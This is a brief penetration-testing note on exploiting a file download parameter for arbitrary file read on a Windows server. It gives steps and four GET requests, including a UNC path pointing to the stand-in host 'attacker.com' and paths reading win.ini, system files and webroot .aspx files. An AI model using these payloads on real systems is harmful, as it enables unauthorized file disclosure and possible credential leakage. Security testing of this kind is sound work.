## Use case

The application allowed for arbitrary file read via a vulnerable file download feature, which could be exploited to read sensitive files on the server due to improper input handling.

## Steps to test

1. Identify a file download functionality in the application, e.g., '?download=fname.xls'.
2. Attempt to inject a valid UNC path in the download parameter, e.g., '\\attacker.com\share\file.txt'.
3. Observe the application's response to confirm if it allows UNC path injection.
4. Test various file paths, appending an 'X' at the end to see if it affects the request, e.g., 'C:\Windows\win.iniX'.
5. Look for files that can be read without high privileges, such as 'C:\Windows\System32\ksxbar.ax'.
6. Attempt to read .aspx files by determining the webroot path through error messages.

## Commands

```text
GET https://client-app.testing.local/?download=\\attacker.com\share\file.txt
GET https://client-app.testing.local/?download=C:\Windows\win.iniX
GET https://client-app.testing.local/?download=C:\Windows\System32\ksxbar.ax
GET https://client-app.testing.local/?download=C:\path\to\webroot\file.aspx
```
